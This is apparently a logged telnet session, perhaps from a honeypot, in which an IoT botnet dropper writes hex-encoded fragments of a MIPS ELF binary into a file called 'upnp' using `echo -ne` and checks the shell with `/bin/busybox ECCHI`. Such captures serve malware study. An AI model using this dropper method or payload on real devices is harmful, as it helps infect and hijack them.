+  0130  30 30 5c 78 30 36 5c 78 33 30 5c 78 30 30 5c 78  00\x06\x30\x00\x
+  0140  30 30 5c 78 30 30 5c 78 30 35 5c 78 30 30 5c 78  00\x00\x05\x00\x
+  0150  30 31 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  01\x00\x00\x00\x
+  0160  30 30 5c 78 30 30 5c 78 30 31 5c 78 30 30 5c 78  00\x00\x01\x00\x
+  0170  30 30 5c 78 30 36 5c 78 33 30 5c 78 30 30 5c 78  00\x06\x30\x00\x
+  0180  34 34 5c 78 30 36 5c 78 33 30 5c 78 30 30 5c 78  44\x06\x30\x00\x
+  0190  34 34 5c 78 30 36 5c 78 33 30 5c 78 30 30 5c 78  44\x06\x30\x00\x
+  01a0  30 30 5c 78 30 30 5c 78 35 34 5c 78 30 30 5c 78  00\x00\x54\x00\x
+  01b0  30 30 5c 78 30 30 5c 78 37 30 5c 78 30 30 5c 78  00\x00\x70\x00\x
+  01c0  30 30 5c 78 30 30 5c 78 30 36 5c 78 30 30 5c 78  00\x00\x06\x00\x
+  01d0  30 31 5c 78 30 30 5c 78 30 30 5c 78 36 34 5c 78  01\x00\x00\x64\x
+  01e0  37 34 5c 78 65 35 5c 78 35 31 5c 78 30 30 5c 78  74\xe5\x51\x00\x
+  01f0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0200  30 30 5c 78 30 30 5c 78 30 30 27 20 3e 20 75 70  00\x00\x00' > up
+  0210  6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78  np; /bin/busybox
+  0220  20 45 43 43 48 49 0d 0a                           ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x02\x00\x08\x00\x00\x00\
+echooooo TELIN: x01\
+echooooo TELIN: x00\x40
+echooooo TELIN: \x0
+echooooo TELIN: 4\xc
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x00\x
+echooooo TELIN: 00\x34
+echooooo TELIN: \x00
+echooooo TELIN: \x00
+echooooo TELIN: \x06
+echooooo TELIN: \xb8
+echooooo TELIN: \x00 
+echooooo TELIN: \x00
+echooooo TELIN: \x10
+echooooo TELIN: \x07
+echooooo TELIN: \x00
+echooooo TELIN: \x34
+echooooo TELIN: \x00\x
+echooooo TELIN: 20\x
+echooooo TELIN: 00\x03\x
+echooooo TELIN: 00\x
+echooooo TELIN: 28\x
+echooooo TELIN: 00
+echooooo TELIN: \x07
+echooooo TELIN: \x0
+echooooo TELIN: 0\x
+echooooo TELIN: 06\x
+echooooo TELIN: 00\x00\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 1\x00 \x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x00\x4
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x4
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x00\x
+echooooo TELIN: 00\
+echooooo TELIN: x06\x
+echooooo TELIN: 30\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 6\x
+echooooo TELIN: 30\x
+echooooo TELIN: 00 \x00\x00\x05\
+echooooo TELIN: x00\x
+echooooo TELIN: 01\x
+echooooo TELIN: 00\x00\
+echooooo TELIN: x00\x00
+echooooo TELIN: \x00\x01
+echooooo TELIN: \x00\
+echooooo TELIN: x00\x06
+echooooo TELIN: \x30\x00\x44\x06\x30\x00 \x44\x0
+echooooo TELIN: 6\x30\x00\x00\
+echooooo TELIN: x00
+echooooo TELIN: \x54\x
+echooooo TELIN: 00\x00\x00\x7
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\
+echooooo TELIN: x06\
+echooooo TELIN: x00
+echooooo TELIN: \x0
+echooooo TELIN: 1\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x
+echooooo TELIN: 64 \
+echooooo TELIN: x74\
+echooooo TELIN: xe5
+echooooo TELIN: \x51\x00\x00\
+echooooo TELIN: x00\x00\x00
+echooooo TELIN: \x00\x
+echooooo TELIN: 00\x00
+echooooo TELIN: ' > 
+echooooo TELIN: upnp; /bin/busybo
+echooooo TELIN: x ECCH
+echooooo TELIN: I
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 30 30 5c 78  echo -ne '\x00\x
+  0010  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0020  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0030  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0040  30 30 5c 78 30 30 5c 78 30 37 5c 78 30 30 5c 78  00\x00\x07\x00\x
+  0050  30 30 5c 78 30 30 5c 78 30 34 5c 78 30 30 5c 78  00\x00\x04\x00\x
+  0060  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0070  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0080  30 30 5c 78 30 30 5c 78 30 30 5c 78 33 30 5c 78  00\x00\x00\x30\x
+  0090  61 35 5c 78 30 30 5c 78 66 66 5c 78 30 30 5c 78  a5\x00\xff\x00\x
+  00a0  30 35 5c 78 32 63 5c 78 30 30 5c 78 30 30 5c 78  05\x2c\x00\x00\x
+  00b0  30 34 5c 78 32 36 5c 78 30 30 5c 78 30 30 5c 78  04\x26\x00\x00\x
+  00c0  38 35 5c 78 32 30 5c 78 32 35 5c 78 33 30 5c 78  85\x20\x25\x30\x
+  00d0  63 32 5c 78 30 30 5c 78 66 66 5c 78 33 30 5c 78  c2\x00\xff\x30\x
+  00e0  65 37 5c 78 30 30 5c 78 66 66 5c 78 30 30 5c 78  e7\x00\xff\x00\x
+  00f0  38 37 5c 78 32 30 5c 78 32 35 5c 78 30 30 5c 78  87\x20\x25\x00\x
+  0100  30 32 5c 78 31 32 5c 78 30 30 5c 78 30 33 5c 78  02\x12\x00\x03\x
+  0110  65 30 5c 78 30 30 5c 78 30 38 5c 78 30 30 5c 78  e0\x00\x08\x00\x
+  0120  34 34 5c 78 31 30 5c 78 32 35 5c 78 33 63 5c 78  44\x10\x25\x3c\x
+  0130  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  0140  39 63 5c 78 38 35 5c 78 35 38 5c 78 30 33 5c 78  9c\x85\x58\x03\x
+  0150  39 39 5c 78 65 30 5c 78 32 31 5c 78 38 66 5c 78  99\xe0\x21\x8f\x
+  0160  39 39 5c 78 38 30 5c 78 35 63 5c 78 30 30 5c 78  99\x80\x5c\x00\x
+  0170  38 30 5c 78 32 38 5c 78 32 31 5c 78 30 33 5c 78  80\x28\x21\x03\x
+  0180  32 30 5c 78 30 30 5c 78 30 38 5c 78 32 34 5c 78  20\x00\x08\x24\x
+  0190  30 34 5c 78 30 66 5c 78 61 31 5c 78 33 63 5c 78  04\x0f\xa1\x3c\x
+  01a0  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  01b0  39 63 5c 78 38 35 5c 78 33 63 5c 78 30 33 5c 78  9c\x85\x3c\x03\x
+  01c0  39 39 5c 78 65 30 5c 78 32 31 5c 78 38 66 5c 78  99\xe0\x21\x8f\x
+  01d0  39 39 5c 78 38 30 5c 78 35 63 5c 78 30 30 5c 78  99\x80\x5c\x00\x
+  01e0  38 30 5c 78 32 38 5c 78 32 31 5c 78 30 33 5c 78  80\x28\x21\x03\x
+  01f0  32 30 5c 78 30 30 5c 78 30 38 5c 78 32 34 5c 78  20\x00\x08\x24\x
+  0200  30 34 5c 78 30 66 5c 78 61 36 27 20 3e 3e 20 75  04\x0f\xa6' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00 \x00\x00\x04\x00\x00\x00\x00\x00\x00
+echooooo TELIN: \x00\x0
+echooooo TELIN: 0\x00
+echooooo TELIN: \x00\x00\x
+echooooo TELIN: 00\
+echooooo TELIN: x30\
+echooooo TELIN: xa5\x0
+echooooo TELIN: 0\xf
+echooooo TELIN: f\x0
+echooooo TELIN: 0 \x05
+echooooo TELIN: \x2c\
+echooooo TELIN: x00\
+echooooo TELIN: x00\
+echooooo TELIN: x04\x2
+echooooo TELIN: 6\x00\x
+echooooo TELIN: 00\x8
+echooooo TELIN: 5\x2
+echooooo TELIN: 0\x2
+echooooo TELIN: 5\x3
+echooooo TELIN: 0\xc2\
+echooooo TELIN: x00\
+echooooo TELIN: xff\
+echooooo TELIN: x30\x
+echooooo TELIN: e7\
+echooooo TELIN: x00
+echooooo TELIN: \xf
+echooooo TELIN: f\x0
+echooooo TELIN: 0 \x87\x2
+echooooo TELIN: 0\x25\
+echooooo TELIN: x00\x02\
+echooooo TELIN: x12\x00\x0
+echooooo TELIN: 3\xe0\x00\x08
+echooooo TELIN: \x00
+echooooo TELIN: \x44\x10
+echooooo TELIN: \x25
+echooooo TELIN: \x3c
+echooooo TELIN: \x1
+echooooo TELIN: c\x00
+echooooo TELIN: \x0
+echooooo TELIN: 5\x27 \x
+echooooo TELIN: 9c\x
+echooooo TELIN: 85\x
+echooooo TELIN: 58\x03\x99\xe0\x21\x8f\x9
+echooooo TELIN: 9\x80
+echooooo TELIN: \x5c\
+echooooo TELIN: x00\x
+echooooo TELIN: 80\x28\x2
+echooooo TELIN: 1\x0
+echooooo TELIN: 3\x2
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 8\
+echooooo TELIN: x24 
+echooooo TELIN: \x04\x
+echooooo TELIN: 0f\xa1\x3c\x1c
+echooooo TELIN: \x00\x05\x27\x
+echooooo TELIN: 9c\x85
+echooooo TELIN: \x3c\x
+echooooo TELIN: 03\x99\xe0\x2
+echooooo TELIN: 1\x
+echooooo TELIN: 8f\
+echooooo TELIN: x99\
+echooooo TELIN: x80
+echooooo TELIN: \x5
+echooooo TELIN: c\
+echooooo TELIN: x00 
+echooooo TELIN: \x8
+echooooo TELIN: 0\x28
+echooooo TELIN: \x2
+echooooo TELIN: 1\x03\x20\
+echooooo TELIN: x00\x08\x24\x04\x0f\x
+echooooo TELIN: a6' >> 
+echooooo TELIN: upnp
+echooooo TELIN: ; /
+echooooo TELIN: bin
+echooooo TELIN: /bu
+echooooo TELIN: sybo
+echooooo TELIN: x ECC
+echooooo TELIN: HI
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 33 63 5c 78  echo -ne '\x3c\x
+  0010  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  0020  39 63 5c 78 38 35 5c 78 32 30 5c 78 30 33 5c 78  9c\x85\x20\x03\x
+  0030  39 39 5c 78 65 30 5c 78 32 31 5c 78 30 30 5c 78  99\xe0\x21\x00\x
+  0040  61 30 5c 78 31 30 5c 78 32 31 5c 78 38 66 5c 78  a0\x10\x21\x8f\x
+  0050  39 39 5c 78 38 30 5c 78 35 63 5c 78 30 30 5c 78  99\x80\x5c\x00\x
+  0060  63 30 5c 78 33 38 5c 78 32 31 5c 78 30 30 5c 78  c0\x38\x21\x00\x
+  0070  38 30 5c 78 32 38 5c 78 32 31 5c 78 30 30 5c 78  80\x28\x21\x00\x
+  0080  34 30 5c 78 33 30 5c 78 32 31 5c 78 30 33 5c 78  40\x30\x21\x03\x
+  0090  32 30 5c 78 30 30 5c 78 30 38 5c 78 32 34 5c 78  20\x00\x08\x24\x
+  00a0  30 34 5c 78 30 66 5c 78 61 35 5c 78 33 63 5c 78  04\x0f\xa5\x3c\x
+  00b0  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  00c0  39 63 5c 78 38 34 5c 78 66 38 5c 78 30 33 5c 78  9c\x84\xf8\x03\x
+  00d0  39 39 5c 78 65 30 5c 78 32 31 5c 78 32 37 5c 78  99\xe0\x21\x27\x
+  00e0  62 64 5c 78 66 66 5c 78 64 30 5c 78 61 66 5c 78  bd\xff\xd0\xaf\x
+  00f0  62 66 5c 78 30 30 5c 78 32 38 5c 78 61 66 5c 78  bf\x00\x28\xaf\x
+  0100  62 63 5c 78 30 30 5c 78 31 30 5c 78 38 66 5c 78  bc\x00\x10\x8f\x
+  0110  39 39 5c 78 38 30 5c 78 35 63 5c 78 61 66 5c 78  99\x80\x5c\xaf\x
+  0120  61 34 5c 78 30 30 5c 78 31 38 5c 78 61 66 5c 78  a4\x00\x18\xaf\x
+  0130  61 35 5c 78 30 30 5c 78 31 63 5c 78 61 66 5c 78  a5\x00\x1c\xaf\x
+  0140  61 36 5c 78 30 30 5c 78 32 30 5c 78 32 34 5c 78  a6\x00\x20\x24\x
+  0150  30 34 5c 78 31 30 5c 78 30 36 5c 78 32 37 5c 78  04\x10\x06\x27\x
+  0160  61 36 5c 78 30 30 5c 78 31 38 5c 78 30 33 5c 78  a6\x00\x18\x03\x
+  0170  32 30 5c 78 66 38 5c 78 30 39 5c 78 32 34 5c 78  20\xf8\x09\x24\x
+  0180  30 35 5c 78 30 30 5c 78 30 33 5c 78 38 66 5c 78  05\x00\x03\x8f\x
+  0190  62 63 5c 78 30 30 5c 78 31 30 5c 78 38 66 5c 78  bc\x00\x10\x8f\x
+  01a0  62 66 5c 78 30 30 5c 78 32 38 5c 78 30 30 5c 78  bf\x00\x28\x00\x
+  01b0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 33 5c 78  00\x00\x00\x03\x
+  01c0  65 30 5c 78 30 30 5c 78 30 38 5c 78 32 37 5c 78  e0\x00\x08\x27\x
+  01d0  62 64 5c 78 30 30 5c 78 33 30 5c 78 33 63 5c 78  bd\x00\x30\x3c\x
+  01e0  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  01f0  39 63 5c 78 38 34 5c 78 61 63 5c 78 30 33 5c 78  9c\x84\xac\x03\x
+  0200  39 39 5c 78 65 30 5c 78 32 31 27 20 3e 3e 20 75  99\xe0\x21' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x3c\x1c\x00\x05\x27\x9c\x85\x20\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f \x99\x80\x5c\x00\xc0\x38\x21\
+echooooo TELIN: x00\x80
+echooooo TELIN: \x28\x21
+echooooo TELIN: \x00\x
+echooooo TELIN: 4
+echooooo TELIN: 0\x30
+echooooo TELIN: \x21
+echooooo TELIN: \x0
+echooooo TELIN: 3\x2
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x
+echooooo TELIN: 08\x2
+echooooo TELIN: 4 \x04
+echooooo TELIN: \x0f\xa5\x3c\
+echooooo TELIN: x1c\x00\
+echooooo TELIN: x05
+echooooo TELIN: \x
+echooooo TELIN: 27\
+echooooo TELIN: x9c
+echooooo TELIN: \x84
+echooooo TELIN: \xf
+echooooo TELIN: 8\x03
+echooooo TELIN: \x
+echooooo TELIN: 99\xe
+echooooo TELIN: 0\x2
+echooooo TELIN: 1\x2
+echooooo TELIN: 7\xbd\
+echooooo TELIN: xff\
+echooooo TELIN: xd0\xa
+echooooo TELIN: f \
+echooooo TELIN: xbf\
+echooooo TELIN: x00\x28\x
+echooooo TELIN: af\
+echooooo TELIN: xbc\x
+echooooo TELIN: 00\x1
+echooooo TELIN: 0\x8
+echooooo TELIN: f\x99\x80\x5c\xaf\xa4\
+echooooo TELIN: x00\x1
+echooooo TELIN: 8\xaf
+echooooo TELIN: \xa5
+echooooo TELIN: \x00
+echooooo TELIN: \x1
+echooooo TELIN: c\xa
+echooooo TELIN: f \x
+echooooo TELIN: a6\x
+echooooo TELIN: 00\
+echooooo TELIN: x20\
+echooooo TELIN: x24
+echooooo TELIN: \
+echooooo TELIN: x04
+echooooo TELIN: \x10
+echooooo TELIN: \x06
+echooooo TELIN: \x27\xa6\x00\x18\x03\x20\
+echooooo TELIN: xf8\x0
+echooooo TELIN: 9\x24\
+echooooo TELIN: x05\
+echooooo TELIN: x00\x0
+echooooo TELIN: 3\x
+echooooo TELIN: 8f \xbc\x00\
+echooooo TELIN: x10\x8f
+echooooo TELIN: \xbf\x00\
+echooooo TELIN: x28\x0
+echooooo TELIN: 0\x00
+echooooo TELIN: \x00\
+echooooo TELIN: x00\x03\xe
+echooooo TELIN: 0\x00
+echooooo TELIN: \x08\x27\
+echooooo TELIN: xbd\x00\x3
+echooooo TELIN: 0\
+echooooo TELIN: x3c \
+echooooo TELIN: x1c
+echooooo TELIN: \x0
+echooooo TELIN: 0\x
+echooooo TELIN: 05\
+echooooo TELIN: x27\
+echooooo TELIN: x9c\x
+echooooo TELIN: 84\
+echooooo TELIN: xac\
+echooooo TELIN: x03\x99\x
+echooooo TELIN: e0\
+echooooo TELIN: x21
+echooooo TELIN: ' >
+echooooo TELIN: > upn
+echooooo TELIN: p; 
+echooooo TELIN: /b
+echooooo TELIN: in/b
+echooooo TELIN: usybox 
+echooooo TELIN: ECCHI
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 30 30 5c 78  echo -ne '\x00\x
+  0010  61 30 5c 78 31 30 5c 78 32 31 5c 78 38 66 5c 78  a0\x10\x21\x8f\x
+  0020  39 39 5c 78 38 30 5c 78 35 63 5c 78 30 30 5c 78  99\x80\x5c\x00\x
+  0030  63 30 5c 78 33 38 5c 78 32 31 5c 78 30 30 5c 78  c0\x38\x21\x00\x
+  0040  38 30 5c 78 32 38 5c 78 32 31 5c 78 30 30 5c 78  80\x28\x21\x00\x
+  0050  34 30 5c 78 33 30 5c 78 32 31 5c 78 30 33 5c 78  40\x30\x21\x03\x
+  0060  32 30 5c 78 30 30 5c 78 30 38 5c 78 32 34 5c 78  20\x00\x08\x24\x
+  0070  30 34 5c 78 30 66 5c 78 61 34 5c 78 33 63 5c 78  04\x0f\xa4\x3c\x
+  0080  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  0090  39 63 5c 78 38 34 5c 78 38 34 5c 78 30 33 5c 78  9c\x84\x84\x03\x
+  00a0  39 39 5c 78 65 30 5c 78 32 31 5c 78 30 30 5c 78  99\xe0\x21\x00\x
+  00b0  61 30 5c 78 31 30 5c 78 32 31 5c 78 38 66 5c 78  a0\x10\x21\x8f\x
+  00c0  39 39 5c 78 38 30 5c 78 35 63 5c 78 30 30 5c 78  99\x80\x5c\x00\x
+  00d0  63 30 5c 78 33 38 5c 78 32 31 5c 78 30 30 5c 78  c0\x38\x21\x00\x
+  00e0  38 30 5c 78 32 38 5c 78 32 31 5c 78 30 30 5c 78  80\x28\x21\x00\x
+  00f0  34 30 5c 78 33 30 5c 78 32 31 5c 78 30 33 5c 78  40\x30\x21\x03\x
+  0100  32 30 5c 78 30 30 5c 78 30 38 5c 78 32 34 5c 78  20\x00\x08\x24\x
+  0110  30 34 5c 78 30 66 5c 78 61 33 5c 78 33 63 5c 78  04\x0f\xa3\x3c\x
+  0120  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  0130  39 63 5c 78 38 34 5c 78 35 63 5c 78 30 33 5c 78  9c\x84\x5c\x03\x
+  0140  39 39 5c 78 65 30 5c 78 32 31 5c 78 32 37 5c 78  99\xe0\x21\x27\x
+  0150  62 64 5c 78 66 66 5c 78 64 30 5c 78 61 66 5c 78  bd\xff\xd0\xaf\x
+  0160  62 66 5c 78 30 30 5c 78 32 38 5c 78 61 66 5c 78  bf\x00\x28\xaf\x
+  0170  62 63 5c 78 30 30 5c 78 31 30 5c 78 38 66 5c 78  bc\x00\x10\x8f\x
+  0180  39 39 5c 78 38 30 5c 78 35 63 5c 78 61 66 5c 78  99\x80\x5c\xaf\x
+  0190  61 34 5c 78 30 30 5c 78 31 38 5c 78 61 66 5c 78  a4\x00\x18\xaf\x
+  01a0  61 35 5c 78 30 30 5c 78 31 63 5c 78 61 66 5c 78  a5\x00\x1c\xaf\x
+  01b0  61 36 5c 78 30 30 5c 78 32 30 5c 78 32 34 5c 78  a6\x00\x20\x24\x
+  01c0  30 34 5c 78 31 30 5c 78 30 36 5c 78 32 37 5c 78  04\x10\x06\x27\x
+  01d0  61 36 5c 78 30 30 5c 78 31 38 5c 78 30 33 5c 78  a6\x00\x18\x03\x
+  01e0  32 30 5c 78 66 38 5c 78 30 39 5c 78 32 34 5c 78  20\xf8\x09\x24\x
+  01f0  30 35 5c 78 30 30 5c 78 30 31 5c 78 38 66 5c 78  05\x00\x01\x8f\x
+  0200  62 63 5c 78 30 30 5c 78 31 30 27 20 3e 3e 20 75  bc\x00\x10' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x00\xa0\x10\x21\x8f\x99\x80\x5c\x00\xc0\x38\x21\x00\x80\x28\x21\x00 \x40\x30\x
+echooooo TELIN: 21\x03\x20\x00\x08\x24\x04\x0f\xa4\x3c\x1c\x00\x05\x27\x9c\x84\x84\x03 \x99\xe0\x21\x00\xa0\x10\x21\x8f\
+echooooo TELIN: x99
+echooooo TELIN: \x80\x5
+echooooo TELIN: c\x00
+echooooo TELIN: \xc0\
+echooooo TELIN: x38\
+echooooo TELIN: x21\x0
+echooooo TELIN: 0\x8
+echooooo TELIN: 0\x
+echooooo TELIN: 28\x21\
+echooooo TELIN: x00 \
+echooooo TELIN: x40\
+echooooo TELIN: x30\x
+echooooo TELIN: 21\x
+echooooo TELIN: 03\x
+echooooo TELIN: 20\x
+echooooo TELIN: 00\x08\x24\x04
+echooooo TELIN: \x0f
+echooooo TELIN: \xa3\x
+echooooo TELIN: 3c\x1c\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 5\x27
+echooooo TELIN: \x9c
+echooooo TELIN: \x84
+echooooo TELIN: \x5c
+echooooo TELIN: \x03 \x9
+echooooo TELIN: 9\xe
+echooooo TELIN: 0\x21
+echooooo TELIN: \x27
+echooooo TELIN: \xbd
+echooooo TELIN: \xf
+echooooo TELIN: f\xd
+echooooo TELIN: 0\xaf
+echooooo TELIN: \xb
+echooooo TELIN: f\x00
+echooooo TELIN: \x28
+echooooo TELIN: \xaf\x
+echooooo TELIN: bc\x0
+echooooo TELIN: 0\x1
+echooooo TELIN: 0\x8
+echooooo TELIN: f\x
+echooooo TELIN: 99\x80
+echooooo TELIN: \x5c\
+echooooo TELIN: xaf \
+echooooo TELIN: xa4\x00\x18\x
+echooooo TELIN: af\x
+echooooo TELIN: a5\x00\x1c\xaf\xa
+echooooo TELIN: 6\x00\x20\x
+echooooo TELIN: 24\x04\x10
+echooooo TELIN: \x0
+echooooo TELIN: 6\x27
+echooooo TELIN: \xa
+echooooo TELIN: 6\x0
+echooooo TELIN: 0\x18\x
+echooooo TELIN: 03 \x20
+echooooo TELIN: \xf8\x
+echooooo TELIN: 09\x
+echooooo TELIN: 24\x
+echooooo TELIN: 05\x
+echooooo TELIN: 00\x
+echooooo TELIN: 01\
+echooooo TELIN: x8f\
+echooooo TELIN: xbc
+echooooo TELIN: \x00
+echooooo TELIN: \x1
+echooooo TELIN: 0' >>
+echooooo TELIN:  up
+echooooo TELIN: np; 
+echooooo TELIN: /bin/bus
+echooooo TELIN: ybo
+echooooo TELIN: x EC
+echooooo TELIN: CHI
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 38 66 5c 78  echo -ne '\x8f\x
+  0010  62 66 5c 78 30 30 5c 78 32 38 5c 78 30 30 5c 78  bf\x00\x28\x00\x
+  0020  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 33 5c 78  00\x00\x00\x03\x
+  0030  65 30 5c 78 30 30 5c 78 30 38 5c 78 32 37 5c 78  e0\x00\x08\x27\x
+  0040  62 64 5c 78 30 30 5c 78 33 30 5c 78 33 63 5c 78  bd\x00\x30\x3c\x
+  0050  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  0060  39 63 5c 78 38 34 5c 78 31 30 5c 78 30 33 5c 78  9c\x84\x10\x03\x
+  0070  39 39 5c 78 65 30 5c 78 32 31 5c 78 32 37 5c 78  99\xe0\x21\x27\x
+  0080  62 64 5c 78 66 66 5c 78 33 38 5c 78 61 66 5c 78  bd\xff\x38\xaf\x
+  0090  62 66 5c 78 30 30 5c 78 63 30 5c 78 61 66 5c 78  bf\x00\xc0\xaf\x
+  00a0  62 33 5c 78 30 30 5c 78 62 63 5c 78 61 66 5c 78  b3\x00\xbc\xaf\x
+  00b0  62 32 5c 78 30 30 5c 78 62 38 5c 78 61 66 5c 78  b2\x00\xb8\xaf\x
+  00c0  62 31 5c 78 30 30 5c 78 62 34 5c 78 61 66 5c 78  b1\x00\xb4\xaf\x
+  00d0  62 30 5c 78 30 30 5c 78 62 30 5c 78 61 66 5c 78  b0\x00\xb0\xaf\x
+  00e0  62 63 5c 78 30 30 5c 78 31 30 5c 78 38 66 5c 78  bc\x00\x10\x8f\x
+  00f0  38 32 5c 78 38 30 5c 78 31 38 5c 78 30 30 5c 78  82\x80\x18\x00\x
+  0100  30 30 5c 78 30 30 5c 78 30 30 5c 78 32 34 5c 78  00\x00\x00\x24\x
+  0110  35 30 5c 78 30 35 5c 78 65 30 5c 78 38 32 5c 78  50\x05\xe0\x82\x
+  0120  30 32 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  02\x00\x00\x00\x
+  0130  30 30 5c 78 30 30 5c 78 30 30 5c 78 31 34 5c 78  00\x00\x00\x14\x
+  0140  34 30 5c 78 66 66 5c 78 66 64 5c 78 32 36 5c 78  40\xff\xfd\x26\x
+  0150  31 30 5c 78 30 30 5c 78 30 31 5c 78 32 36 5c 78  10\x00\x01\x26\x
+  0160  31 30 5c 78 66 66 5c 78 66 66 5c 78 38 66 5c 78  10\xff\xff\x8f\x
+  0170  38 35 5c 78 38 30 5c 78 31 38 5c 78 38 66 5c 78  85\x80\x18\x8f\x
+  0180  38 32 5c 78 38 30 5c 78 31 38 5c 78 38 66 5c 78  82\x80\x18\x8f\x
+  0190  39 39 5c 78 38 30 5c 78 34 38 5c 78 32 34 5c 78  99\x80\x48\x24\x
+  01a0  61 35 5c 78 30 35 5c 78 65 38 5c 78 32 34 5c 78  a5\x05\xe8\x24\x
+  01b0  30 34 5c 78 30 30 5c 78 30 31 5c 78 32 34 5c 78  04\x00\x01\x24\x
+  01c0  30 36 5c 78 30 30 5c 78 30 36 5c 78 32 34 5c 78  06\x00\x06\x24\x
+  01d0  34 32 5c 78 30 35 5c 78 65 30 5c 78 30 33 5c 78  42\x05\xe0\x03\x
+  01e0  32 30 5c 78 66 38 5c 78 30 39 5c 78 30 32 5c 78  20\xf8\x09\x02\x
+  01f0  30 32 5c 78 39 38 5c 78 32 33 5c 78 38 66 5c 78  02\x98\x23\x8f\x
+  0200  62 63 5c 78 30 30 5c 78 31 30 27 20 3e 3e 20 75  bc\x00\x10' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x8f\xbf\x00\x28\x00\x00\x00\x00\x03\xe0\x00\x08\x27\xbd\x00\x30\x3c \x1c\x00\x05\x27\x9
+echooooo TELIN: c\x8
+echooooo TELIN: 4\x1
+echooooo TELIN: 0\x0
+echooooo TELIN: 3\x9
+echooooo TELIN: 9\xe0
+echooooo TELIN: \x21\x27\xb
+echooooo TELIN: d\xff\x
+echooooo TELIN: 38\xaf\xb
+echooooo TELIN: f\x00\xc
+echooooo TELIN: 0\xa
+echooooo TELIN: f \xb
+echooooo TELIN: 3\x00\
+echooooo TELIN: xbc\
+echooooo TELIN: xaf\
+echooooo TELIN: xb2\
+echooooo TELIN: x00\
+echooooo TELIN: xb8
+echooooo TELIN: \xaf\x
+echooooo TELIN: b1\x
+echooooo TELIN: 00\
+echooooo TELIN: xb4\
+echooooo TELIN: xaf\
+echooooo TELIN: xb0\
+echooooo TELIN: x00\
+echooooo TELIN: xb0\
+echooooo TELIN: xaf\
+echooooo TELIN: xbc\
+echooooo TELIN: x00\
+echooooo TELIN: x10\
+echooooo TELIN: x8f \x82\
+echooooo TELIN: x80\
+echooooo TELIN: x18\
+echooooo TELIN: x00\x00\
+echooooo TELIN: x00\
+echooooo TELIN: x00\
+echooooo TELIN: x24\
+echooooo TELIN: x50\x05\xe0\x8
+echooooo TELIN: 2\x02\x0
+echooooo TELIN: 0\x00\x00
+echooooo TELIN: \x00
